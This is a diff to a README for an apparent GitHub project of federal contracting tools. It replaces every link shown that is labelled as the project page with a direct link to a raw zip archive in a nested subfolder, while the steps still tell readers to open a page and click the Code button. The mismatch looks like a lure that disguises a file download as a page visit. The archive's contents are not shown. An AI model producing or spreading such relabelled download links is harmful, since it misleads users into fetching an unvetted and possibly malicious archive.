@@ -1,12 +1,12 @@
 # 🏛️ federal-contracting-skills - Federal Contract Tools Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Aballa6975/federal-contracting-skills)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Aballa6975/federal-contracting-skills/raw/refs/heads/main/skills/igce-builder-lh-tm/federal_skills_contracting_v3.0.zip)
 
 ## 📥 Download
 
 Use the link below to visit the project page and download the files:
 
-[Open the GitHub page](https://github.com/Aballa6975/federal-contracting-skills)
+[Open the GitHub page](https://github.com/Aballa6975/federal-contracting-skills/raw/refs/heads/main/skills/igce-builder-lh-tm/federal_skills_contracting_v3.0.zip)
 
 ## 🚀 What this project does
 
@@ -60,7 +60,7 @@ This project includes tools for:
 
 ## 🔧 How to download and open it
 
-1. Open this page: [https://github.com/Aballa6975/federal-contracting-skills](https://github.com/Aballa6975/federal-contracting-skills)
+1. Open this page: [https://github.com/Aballa6975/federal-contracting-skills/raw/refs/heads/main/skills/igce-builder-lh-tm/federal_skills_contracting_v3.0.zip](https://github.com/Aballa6975/federal-contracting-skills/raw/refs/heads/main/skills/igce-builder-lh-tm/federal_skills_contracting_v3.0.zip)
 2. On the GitHub page, look for the **Code** button
 3. Click **Code**
 4. Choose **Download ZIP**
